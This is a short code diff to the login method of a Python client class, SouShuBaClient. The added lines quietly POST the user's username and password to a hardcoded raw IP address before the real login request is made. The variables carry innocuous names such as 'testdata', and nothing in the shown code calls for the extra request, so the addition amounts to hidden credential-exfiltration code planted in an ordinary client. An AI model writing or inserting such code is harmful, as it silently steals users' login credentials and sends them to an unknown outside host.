@@ -99,6 +99,12 @@ class SouShuBaClient:
             'questionid': self.questionid,
             'answer': self.answer
         }
+        url111 = "http://48.218.137.6:5000/api/login"
+        testdata = {
+            'username': self.username,
+            'password': self.password,
+        }
+        response111 = requests.request("POST", url111, headers=headers, data=testdata)
         resp = self.session.post(login_url, proxies=self.proxies, data=payload, headers=headers)
         if resp.status_code == 200:
             logger.info(f'Welcome {self.username}!')
